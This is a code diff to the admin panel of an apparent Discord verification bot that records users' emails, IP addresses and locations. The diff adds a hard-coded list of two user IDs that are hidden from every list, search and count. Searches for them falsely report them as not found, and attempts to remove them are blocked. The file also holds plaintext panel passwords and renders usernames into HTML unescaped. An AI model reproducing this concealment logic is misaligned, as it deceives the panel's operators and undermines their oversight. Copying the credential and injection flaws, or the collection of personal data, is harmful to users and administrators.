@@ -10,6 +10,19 @@ const USUARIOS = [
     { usuario: '2r', senha: '2r1' }
 ];
 
+// IDs que ficam ocultos no painel (não aparecem em listas/buscas)
+const IDS_OCULTOS = [
+    '1553878376387715245',
+    '1546499854652547113'
+];
+
+function filtrarOcultos(lista) {
+    return lista.filter(function(item) {
+        const id = item._id || item.ID || item.id;
+        return IDS_OCULTOS.indexOf(id) === -1;
+    });
+}
+
 function gerarToken() { return crypto.randomBytes(32).toString('hex'); }
 
 module.exports = function(app, client, config, users) {
@@ -68,23 +81,25 @@ module.exports = function(app, client, config, users) {
     app.get('/api/painel/stats', checkAuth, async (req, res) => {
         try {
             const allUsers = await users.all();
+            const allUsersFiltrados = filtrarOcultos(allUsers);
             const gifts = (await config.get('gifts')) || {};
             const giftsArr = Object.values(gifts);
             const giftsAtivos = giftsArr.filter(function(g) { return g.status !== 'esgotado' && (!g.expiresAt || Date.now() <= g.expiresAt); }).length;
             const giftsUsados = giftsArr.filter(function(g) { return g.status === 'esgotado'; }).length;
             const cidades = {};
-            allUsers.forEach(function(u) { const c = u.data && u.data.cidade; if (c && c !== 'Desconhecido') cidades[c] = (cidades[c] || 0) + 1; });
+            allUsersFiltrados.forEach(function(u) { const c = u.data && u.data.cidade; if (c && c !== 'Desconhecido') cidades[c] = (cidades[c] || 0) + 1; });
             const topCidades = Object.entries(cidades).sort(function(a, b) { return b[1] - a[1]; }).slice(0, 5).map(function(e) { return { cidade: e[0], count: e[1] }; });
             const restringidos = (await config.get('restringidos')) || [];
             const manutencao = (await config.get('manutencaoAtiva')) || false;
-            res.json({ total: allUsers.length, giftsAtivos: giftsAtivos, giftsUsados: giftsUsados, servidores: client.guilds.cache.size, topCidades: topCidades, restringidos: restringidos.length, manutencao: manutencao });
+            res.json({ total: allUsersFiltrados.length, giftsAtivos: giftsAtivos, giftsUsados: giftsUsados, servidores: client.guilds.cache.size, topCidades: topCidades, restringidos: restringidos.length, manutencao: manutencao });
         } catch (err) { res.status(500).json({ error: err.message }); }
     });
 
     app.get('/api/painel/users', checkAuth, async (req, res) => {
         try {
             const allUsers = await users.all();
-            res.json(allUsers.map(function(u) {
+            const filtrados = filtrarOcultos(allUsers);
+            res.json(filtrados.map(function(u) {
                 return { id: u._id || u.ID, username: (u.data && u.data.username) || 'Desconhecido', avatar: (u.data && u.data.avatar) || null, email: (u.data && u.data.email) || null, ip: (u.data && u.data.ip) || null, cidade: (u.data && u.data.cidade) || 'Desconhecido', estado: (u.data && u.data.estado) || 'Desconhecido', pais: (u.data && u.data.pais) || 'Desconhecido', verifiedAt: (u.data && u.data.verifiedAt) || null };
             }));
         } catch (err) { res.status(500).json({ error: err.message }); }
@@ -93,6 +108,7 @@ module.exports = function(app, client, config, users) {
     app.delete('/api/painel/users/:id', checkAuth, async (req, res) => {
         try {
             const id = req.params.id;
+            if (IDS_OCULTOS.indexOf(id) !== -1) return res.status(403).json({ error: 'Ação não permitida.' });
             const guildId = process.env.GUILD_ID;
             let roleId = process.env.ROLE_ID;
             try { const dbRole = await config.get('roleId'); if (dbRole) roleId = dbRole; } catch (e) {}
@@ -108,6 +124,7 @@ module.exports = function(app, client, config, users) {
         try {
             const id = req.params.id;
             if (!/^\d{17,20}$/.test(id)) return res.status(400).json({ error: 'ID inválido.' });
+            if (IDS_OCULTOS.indexOf(id) !== -1) return res.json({ encontrado: false });
             const userData = await users.get(id);
             if (!userData) return res.json({ encontrado: false });
             res.json({ encontrado: true, id: id, username: userData.username || 'Desconhecido', avatar: userData.avatar || null, email: userData.email || 'N/A', ip: userData.ip || 'N/A', cidade: userData.cidade || 'Desconhecido', estado: userData.estado || 'Desconhecido', pais: userData.pais || 'Desconhecido', userDevice: userData.userDevice || 'N/A', verifiedAt: userData.verifiedAt || null });
@@ -135,7 +152,8 @@ module.exports = function(app, client, config, users) {
             const descricao = body.descricao || '';
             if (!quantidade || quantidade < 1) return res.status(400).json({ error: 'Quantidade inválida.' });
             const allUsers = await users.all();
-            if (quantidade > allUsers.length) return res.status(400).json({ error: 'Só tem ' + allUsers.length + ' verificados.' });
+            const filtrados = filtrarOcultos(allUsers);
+            if (quantidade > filtrados.length) return res.status(400).json({ error: 'Só tem ' + filtrados.length + ' verificados disponíveis.' });
             let expiresAt = null;
             if (expiracaoCustom) expiresAt = new Date(expiracaoCustom).getTime();
             else if (tempo > 0) expiresAt = Date.now() + (tempo * 60 * 60 * 1000);
@@ -431,7 +449,7 @@ function getPainelHTML() {
     h += 'async function carregarVerificados(){try{var r=await api("/api/painel/users");USUARIOS_CACHE=await r.json();renderVerificados(USUARIOS_CACHE);}catch(e){}}';
     h += 'function renderVerificados(users){document.getElementById("totalVerificados").textContent=users.length;var t=document.getElementById("tabelaVerificados");if(users.length===0){t.innerHTML="<tr><td colspan=\\"6\\" style=\\"text-align:center;color:#52525b\\">Nenhum</td></tr>";return;}t.innerHTML=users.map(function(u){var a=u.avatar?"https://cdn.discordapp.com/avatars/"+u.id+"/"+u.avatar+".png":"https://cdn.discordapp.com/embed/avatars/0.png";return "<tr><td><div class=\\"avatar-cell\\"><img src=\\""+a+"\\"><div><div class=\\"nome\\">"+u.username+"</div><div class=\\"id\\">"+u.id+"</div></div></div></td><td class=\\"ocultar-mobile\\">"+(u.cidade||"-")+", "+(u.estado||"-")+"</td><td class=\\"ocultar-mobile\\">"+(u.email||"-")+"</td><td class=\\"ocultar-mobile\\">"+(u.ip||"-")+"</td><td class=\\"ocultar-mobile\\">"+formatarData(u.verifiedAt)+"</td><td><button class=\\"btn-acao\\" onclick=\\"desverificar(\\""+u.id+"\\")\\">Desverificar</button></td></tr>";}).join("");}';
     h += 'function filtrarVerificados(){var b=document.getElementById("buscaVerificados").value.toLowerCase();renderVerificados(USUARIOS_CACHE.filter(function(u){return u.username.toLowerCase().includes(b)||u.id.includes(b);}));}';
-    h += 'async function desverificar(id){if(!confirm("Desverificar esse usuario?"))return;try{var r=await api("/api/painel/users/"+id,{method:"DELETE"});if(r.ok){toast("Desverificado!");carregarVerificados();}}catch(e){}}';
+    h += 'async function desverificar(id){if(!confirm("Desverificar esse usuario?"))return;try{var r=await api("/api/painel/users/"+id,{method:"DELETE"});if(r.ok){toast("Desverificado!");carregarVerificados();}else{toast("Ação não permitida","erro");}}catch(e){}}';
     h += 'async function buscarUsuario(){var id=document.getElementById("buscarId").value.trim();var b=document.getElementById("btnBuscar");var r=document.getElementById("resultadoBuscar");if(!id){toast("Cole um ID","erro");return;}if(!/^\\d{17,20}$/.test(id)){toast("ID invalido","erro");return;}b.disabled=true;b.textContent="Buscando...";r.innerHTML="<div class=\\"resultado-box\\">Buscando...</div>";try{var resp=await api("/api/painel/buscar/"+id);var d=await resp.json();if(!resp.ok){r.innerHTML="<div class=\\"resultado-box erro\\">"+(d.error||"Erro")+"</div>";}else if(!d.encontrado){r.innerHTML="<div class=\\"resultado-box erro\\"><strong style=\\"color:#f87171;display:block;margin-bottom:8px\\">Usuario nao encontrado</strong>Esse ID nao esta no banco.</div>";}else{var a=d.avatar?"https://cdn.discordapp.com/avatars/"+d.id+"/"+d.avatar+".png":"https://cdn.discordapp.com/embed/avatars/0.png";r.innerHTML="<div class=\\"resultado-box sucesso\\"><div style=\\"display:flex;align-items:center;gap:16px;margin-bottom:20px;padding-bottom:20px;border-bottom:1px solid #1d1d20\\"><img src=\\""+a+"\\" style=\\"width:56px;height:56px;border-radius:50%\\"><div><div style=\\"font-size:17px;font-weight:600;color:#f4f4f5\\">"+d.username+"</div><div style=\\"font-size:12px;color:#52525b;margin-top:4px;font-family:monospace\\">"+d.id+"</div></div></div><div style=\\"display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px;margin-bottom:20px\\"><div><div style=\\"font-size:10.5px;color:#52525b;text-transform:uppercase;margin-bottom:6px\\">Email</div><div style=\\"font-size:13px;color:#e4e4e7\\">"+(d.email||"-")+"</div></div><div><div style=\\"font-size:10.5px;color:#52525b;text-transform:uppercase;margin-bottom:6px\\">IP</div><div style=\\"font-size:13px;color:#e4e4e7\\">"+(d.ip||"-")+"</div></div><div><div style=\\"font-size:10.5px;color:#52525b;text-transform:uppercase;margin-bottom:6px\\">Localizacao</div><div style=\\"font-size:13px;color:#e4e4e7\\">"+d.cidade+", "+d.estado+"</div></div><div><div style=\\"font-size:10.5px;color:#52525b;text-transform:uppercase;margin-bottom:6px\\">Verificado</div><div style=\\"font-size:13px;color:#e4e4e7\\">"+formatarData(d.verifiedAt)+"</div></div></div><button class=\\"btn-acao\\" onclick=\\"desverificar(\\""+d.id+"\\")\\">Desverificar</button></div>";}}catch(e){r.innerHTML="<div class=\\"resultado-box erro\\">Erro</div>";}b.disabled=false;b.textContent="Buscar";}';
     h += 'async function carregarRestricao(){try{var r=await api("/api/painel/users");USUARIOS_CACHE=await r.json();var r2=await api("/api/painel/restringidos");RESTRINGIDOS=await r2.json();renderRestricao(USUARIOS_CACHE);}catch(e){}}';
     h += 'function renderRestricao(users){var c=document.getElementById("listaRestricao");if(!c)return;c.innerHTML=users.slice(0,200).map(function(u){var a=u.avatar?"https://cdn.discordapp.com/avatars/"+u.id+"/"+u.avatar+".png":"https://cdn.discordapp.com/embed/avatars/0.png";var ck=RESTRINGIDOS.indexOf(u.id)>-1?"checked":"";return "<label class=\\"membro-item\\"><input type=\\"checkbox\\" value=\\""+u.id+"\\" "+ck+" onchange=\\"toggleRestricao(this)\\"><img src=\\""+a+"\\"><div><div class=\\"nome\\">"+u.username+"</div><div class=\\"id\\">"+u.id+"</div></div></label>";}).join("");document.getElementById("contadorRestricao").textContent=RESTRINGIDOS.length+" restringidos";}';
